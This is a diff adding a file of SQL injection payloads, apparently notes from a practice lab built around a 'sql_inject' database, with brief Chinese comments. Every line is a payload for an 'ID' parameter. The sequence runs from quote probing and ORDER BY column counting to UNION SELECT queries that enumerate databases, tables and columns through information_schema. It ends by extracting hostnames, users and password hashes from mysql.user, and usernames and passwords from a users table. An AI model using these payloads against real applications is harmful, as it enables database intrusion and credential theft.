@@ -1,0 +1,32 @@
+ID:1
+ID:1'
+ID:'
+ID:1' order by 1
+ID:1' order by 1--
+ID:1' order by 1 -- \
+ID:1' order by 2 -- \
+ID:1' order by 3 -- \
+ID:1' order by 4 -- \
+ID:1' union select 1,2,3
+ID:1' union select 1,2,3 -- \
+ID:select database();
+ID:1' UNION select 1,2,version()-- \
+ID:1' UNION select database(),2,version()-- \
+ID:' UNION select database(),2,version()-- \
+ID:' UNION select 1,2,database()-- \
+ID:' UNION select 1,2,user()-- \  判断当前用户
+ID:' UNION select 1,2,ord(mid(user(),1,1))==114-- \
+ID:' UNION select 1,2,@@global.version_compile_os from mysql.user-- \ 判断当前系统
+ID:' UNION select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1-- \ 当前mysql中的第一个数据库
+ID:' UNION select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1-- \ 当前mysql中的第二个数据库
+ID:' UNION select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 3,3-- \
+ID:' UNION select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 6,6-- \
+ID:' UNION select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 8,8-- \
+ID:' UNION select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA-- \ 爆出所有的数据库
+ID:' UNION select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x6d7973716c-- \
+ID:' UNION select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x6d7973716c-- \ 爆出所有的表
+ID:' UNION select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x73716c5f696e6a656374-- \ 爆出所有的表
+ID:' UNION select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x7573657273-- \
+ID:' UNION select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x7573657273 LIMIT 0,1 -- \ 爆出所有的字段
+ID:' UNION select 1,2, group_concat(Host,User,Password) from mysql.user-- \ 爆出mysql库的user表
+ID:' UNION select 1,2, group_concat(username,password) from sql_inject.users-- \
